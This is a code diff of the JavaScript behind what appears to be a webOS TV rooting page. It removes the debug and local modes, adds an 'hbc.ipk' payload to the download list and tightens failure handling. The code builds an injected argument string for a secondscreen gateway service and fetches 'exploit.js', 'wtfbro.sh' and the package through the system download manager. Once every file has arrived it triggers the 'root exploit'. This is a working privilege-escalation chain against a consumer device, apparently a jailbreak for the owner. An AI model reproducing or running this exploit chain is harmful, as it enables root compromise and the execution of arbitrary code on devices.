@@ -87,8 +87,6 @@
     var detailEl = document.getElementById('detail');
     var hackatt=0;
     var launched=false;
-    var debugMode = new URLSearchParams(window.location.search).has('debug');
-    var localMode = new URLSearchParams(window.location.search).has('local');
     var targetDir = '/media/internal/downloads';
     var hackperm = [
 {"inputParams" : "meow nya :3 /usr/palm/services/com.webos.service.secondscreen.gateway -- /tmp/cgroup QwQ " + targetDir},
@@ -160,37 +158,36 @@
         'services.json', 
         'exploit.js'   , 
         'wtfbro.sh'    , 
+        'hbc.ipk'      ,
       ];
-      if (debugMode) {files.push("debug");}
-      if (localMode) {
-	      files.push("telnetd");
-	      files.push("hbc.ipk");
-      }
       var written = 0;
+      var downloadFailed = false;
 
       function downloadFile(file) {
-	var b = new window.PalmServiceBridge();
+        var completed = false;
+        var b = new window.PalmServiceBridge();
         b.onservicecallback = function(payload) {
- if (launched){
-		      return;
-	      }
-	//Make sure it wont code as below wont get run after root exploit 
-	//bc sometime code as below do get run 
-	//useually it display a error msg when those code after the root exploit
-
+          if (launched || downloadFailed) return;
           var parsed = parse(payload);
-          if (!isObject(parsed)) { failStep('payload download', file + ': invalid response'); return; }
-          if (parsed.returnValue === false) { failStep('payload download', file + ': ' + (parsed.errorText || 'failed')); return; }
-          if (parsed.completed === true && !parsed.aborted && !parsed.interrupted) {
+          if (!isObject(parsed)) {
+            downloadFailed = true;
+            failStep('payload download', file + ': invalid response');
+            return;
+          }
+          if (parsed.returnValue === false || parsed.aborted || parsed.interrupted || parsed.state === 'failed') {
+            downloadFailed = true;
+            failStep('payload download', file + ': ' + (parsed.errorText || 'failed'));
+            return;
+          }
+          if (parsed.completed === true && !completed) {
+            completed = true;
             written++;
             setState('pending', 'downloaded ' + written + '/' + files.length + ' payload files...');
-	if (written === files.length){
-		launched=true;      
-	setState('pending', 'Launching root exploit. Watch your TV for the result...');
-hackjserver();  
-	}
-          } else if (parsed.aborted || parsed.interrupted || parsed.state === 'failed') {
-            failStep('payload download', file + ': ' + (parsed.errorText || 'aborted'));
+            if (written === files.length) {
+              launched = true;
+              setState('pending', 'Launching root exploit. Watch your TV for the result...');
+              hackjserver();
+            }
           }
         };
         b.call('luna://com.webos.service.downloadmanager/download',
